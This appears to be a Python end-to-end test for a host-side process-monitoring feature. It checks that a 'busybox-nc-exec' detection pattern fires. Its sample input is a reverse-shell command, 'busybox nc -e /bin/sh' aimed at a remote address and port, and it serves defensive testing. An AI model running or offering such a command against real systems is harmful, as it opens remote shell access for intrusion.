"""End-to-end tests for host-side PROC_EVENTS monitoring via NETLINK_CONNECTOR."""

from support.monitoring import (
    run_exec_pattern_test,
)


def test_busybox_nc_exec_detected(test_workspace, coi_binary):
    """busybox-nc-exec pattern fires when argv[0] is 'busybox' and both 'nc' and '-e' appear."""
    run_exec_pattern_test(
        test_workspace,
        coi_binary,
        75,
        "busybox-nc-exec",
        "busybox nc -e /bin/sh 10.255.255.1 9999",
    )
